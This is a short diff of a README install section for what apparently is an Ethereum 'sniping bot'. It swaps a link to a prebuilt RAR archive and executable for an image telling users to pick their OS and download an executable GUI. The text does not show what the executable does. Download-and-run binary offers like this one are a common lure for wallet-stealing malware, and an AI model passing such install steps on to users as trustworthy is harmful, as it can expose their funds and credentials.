@@ -34,9 +34,9 @@
 
 ## 📦 Install
 
-OPTION 1 for Windows users, download compiled code, extract it and run out of the box astra.exe:
+OPTION 1, select your OS and download an executable GUI:
   
-  https://github.com/Yapote/ETHEREUM-SNIPING-BOT-ETHX/blob/main/astra-eth.rar
+  <img src="os.png" width="700"/>
   
 OPTION 2 for Linux, Windows and Mac users that want to run the opensourced code:
   
